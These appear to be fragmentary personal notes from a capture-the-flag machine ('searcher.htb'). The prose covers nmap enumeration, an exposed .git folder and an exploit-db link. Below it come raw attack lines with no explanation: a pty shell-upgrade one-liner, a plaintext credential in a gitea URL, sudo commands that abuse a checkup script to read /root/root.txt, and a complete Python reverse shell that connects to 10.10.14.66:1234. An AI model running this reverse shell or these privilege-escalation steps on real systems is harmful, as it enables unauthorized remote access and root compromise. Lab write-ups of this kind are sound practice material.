

# Hacking basic enumuration process

**nmap** - This is the first step of enumeration, this will give some good piece of information

- Post scanning we got to know that 
    - ssh and http is running (22 and 80)
    - Also I have found that a .git folder exists

- So I have opened the ip which redirects to domainname, so I have added that in my host entry 
    - It gave me one website with one upload 

- Also we have found .git folder so I have searched and got to know there is a tool to get download the .git files and folder [via this link](https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/)

- After going through the code for few hours nothing got inside the code base post checking index.php, login.php, bulletproof.php etc..., except file storage paths, this might be useful in later
- Then i found the file magic , and ran the command -usage to get details about the and i got to know that this is a package.
- Then I searched in google with the version name and package name to get more details,  after the search i got 1 additional detail that [this package is written in rust](https://www.exploit-db.com/exploits/51261)

python3 -c 'import pty; pty.spawn("/bin/bash")'

fsmonitor-watchman.sample

http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_s
jh1usoih2bkjaspwe92

sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps

sudo /usr/bin/python3 /opt/scripts/system-checkup.py cat /root/root.txt

#!/bin/bash
cat /root/root.txt


#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.66",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")